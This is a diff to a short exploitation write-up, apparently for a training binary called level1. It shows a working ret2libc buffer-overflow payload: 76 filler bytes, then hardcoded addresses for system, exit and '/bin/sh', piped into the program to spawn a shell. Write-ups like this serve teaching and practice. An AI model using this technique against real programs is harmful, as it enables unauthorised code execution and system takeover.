@@ -1,15 +1,16 @@
-Buffer Overflow - ret2libc
+- Binary calls fgets. It doesn't check the input size, we can easily overflow the buffer.
+- We process the offset (76) to overwrite $eip and perform a ret2libc
 
 (python -c "print('A' * 76 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level1
 
 'A' * 76 -> Size of the buffer
 '\x60\xb0\xe6\xb7' -> Address of system
-'\xe0\xeb\xe5\xb7' -> Address of exit to avoid segv
+'\xe0\xeb\xe5\xb7' -> Address of exit to avoid segv (useless)
 '\x58\xcc\xf8\xb7' -> Address of "/bin/sh" given to system
 
 Then cat to avoid the shell to close
 
-Alternate Solution:
+- Alternate Solution:
 
 sub esp, 0x50
 
